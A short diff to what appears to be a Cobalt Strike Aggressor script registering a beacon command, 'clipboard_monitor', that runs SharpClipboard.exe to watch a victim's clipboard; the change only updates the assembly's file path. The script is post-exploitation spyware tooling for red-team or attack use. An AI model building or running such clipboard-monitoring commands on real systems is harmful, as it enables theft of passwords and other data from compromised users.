@@ -4,7 +4,7 @@ beacon_command_register("clipboard_monitor", "This will monitor a victims clipbo
 alias clipboard_monitor{
 	local('$bid $asm $desc @args $argu');
 	$bid = $1;
-	$asm = "/opt/exe/SharpClipboard.exe";
+	$asm = "/opt/cobalt_strike_extension_kit/exe/SharpClipboard.exe";
 	$desc = "Clipboard Monitor";
 	@args = @_;
 	remove(@args, $bid);
